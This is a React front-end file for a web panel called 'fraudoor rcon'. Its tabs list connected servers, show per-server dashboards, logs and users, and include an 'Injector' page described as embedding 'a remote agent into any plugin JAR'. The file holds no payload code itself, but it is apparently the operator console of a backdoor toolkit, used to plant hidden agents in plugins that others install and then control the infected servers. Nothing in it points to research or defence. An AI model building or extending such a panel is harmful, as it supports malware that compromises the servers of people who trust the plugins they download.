import React, { useState, useEffect } from 'react';
import { AuthProvider, useAuth } from './AuthContext';
import Servers from './pages/Servers';
import ServerDashboard from './pages/ServerDashboard';
import Injection from './pages/Injection';
import Login from './pages/Login';
import Logs from './pages/Logs';
import Users from './pages/Users';
import { apiUrl } from './api';

const TABS = { SERVERS: 'servers', INJECTION: 'injection', LOGS: 'logs', USERS: 'users' };

function ServersIcon() {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><circle cx="6" cy="6" r="1" fill="currentColor"/><circle cx="6" cy="18" r="1" fill="currentColor"/></svg>;
}

function InjectionIcon() {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16a2 2 0 0 1-1.09 1.76l-6 3.24a2 2 0 0 1-1.82 0l-6-3.24A2 2 0 0 1 5 16v-6a2 2 0 0 1 1.09-1.76l6-3.24a2 2 0 0 1 1.82 0l6 3.24A2 2 0 0 1 21 10Z"/><line x1="12" y1="22" x2="12" y2="11"/></svg>;
}

function LogsIcon() {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>;
}

function LogoutIcon() {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>;
}

function UsersIcon() {
  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>;
}

function AppContent() {
  const { user, logout, isAdmin } = useAuth();
  const [tab, setTab] = useState(TABS.SERVERS);
  const [selectedServer, setSelectedServer] = useState(null);
  const [servers, setServers] = useState([]);
  const [loggedIn, setLoggedIn] = useState(!!user);

  useEffect(() => {
    if (!loggedIn) return;
    const fetchServers = async () => {
      try {
        const res = await fetch(apiUrl('/api/servers'));
        if (res.ok) setServers(await res.json());
      } catch {}
    };
    fetchServers();
    const interval = setInterval(fetchServers, 5000);
    return () => clearInterval(interval);
  }, [loggedIn]);

  if (!loggedIn) {
    return <Login onLogin={() => setLoggedIn(true)} />;
  }

  if (selectedServer) {
    return (
      <div className="app-layout">
        <Sidebar tab={TABS.SERVERS} setTab={setTab} servers={servers} user={user} onLogout={logout} isAdmin={isAdmin} onServersClick={() => setSelectedServer(null)} />
        <div className="main-area">
          <ServerDashboard
            server={selectedServer}
            onBack={() => setSelectedServer(null)}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="app-layout">
      <Sidebar tab={tab} setTab={setTab} servers={servers} user={user} onLogout={logout} isAdmin={isAdmin} />
      <div className="main-area">
        {tab === TABS.SERVERS && (
          <>
            <h1 className="page-title">Servers</h1>
            <p className="page-subtitle">Monitor and manage your connected servers</p>
            <Servers servers={servers} onSelect={setSelectedServer} />
          </>
        )}
        {tab === TABS.INJECTION && (
          <>
            <h1 className="page-title">Injector</h1>
            <p className="page-subtitle">Embed a remote agent into any plugin JAR</p>
            <Injection />
          </>
        )}
        {tab === TABS.LOGS && isAdmin && (
          <Logs />
        )}
        {tab === TABS.USERS && isAdmin && (
          <Users />
        )}
      </div>
    </div>
  );
}

function Sidebar({ tab, setTab, servers, user, onLogout, isAdmin, onServersClick }) {
  const online = servers.filter(s => s.online).length;
  const handleServers = () => {
    if (onServersClick) onServersClick();
    setTab('servers');
  };
  return (
    <aside className="sidebar">
      <div className="sidebar-brand">
        <div className="sidebar-logo">F</div>
        <div className="sidebar-brand-text">fraudoor<span>rcon</span></div>
      </div>
      <nav className="sidebar-nav">
        <div className="sidebar-nav-label">Navigation</div>
        <button
          className={`sidebar-btn ${tab === 'servers' ? 'active' : ''}`}
          onClick={handleServers}
          title="Servers"
        >
          <ServersIcon />
          <span>Servers</span>
          <span className="sidebar-count">{online}</span>
        </button>
        <button
          className={`sidebar-btn ${tab === 'injection' ? 'active' : ''}`}
          onClick={() => setTab('injection')}
          title="Injector"
        >
          <InjectionIcon />
          <span>Inject</span>
        </button>
        {isAdmin && (
          <button
            className={`sidebar-btn ${tab === 'logs' ? 'active' : ''}`}
            onClick={() => setTab('logs')}
            title="Logs"
          >
            <LogsIcon />
            <span>Logs</span>
          </button>
        )}
        {isAdmin && (
          <button
            className={`sidebar-btn ${tab === 'users' ? 'active' : ''}`}
            onClick={() => setTab('users')}
            title="Users"
          >
            <UsersIcon />
            <span>Users</span>
          </button>
        )}
      </nav>
      <div className="sidebar-footer">
        <div className="sidebar-user">
          <div className="sidebar-user-avatar">{user?.username?.charAt(0).toUpperCase()}</div>
          <div>
            <div>{user?.username}</div>
            <div className="sidebar-user-role">{user?.role === 'admin' ? 'Admin' : 'User'}</div>
          </div>
        </div>
        <button className="sidebar-logout" onClick={onLogout} title="Logout">
          <LogoutIcon />
        </button>
      </div>
    </aside>
  );
}

export default function App() {
  return (
    <AuthProvider>
      <AppContent />
    </AuthProvider>
  );
}
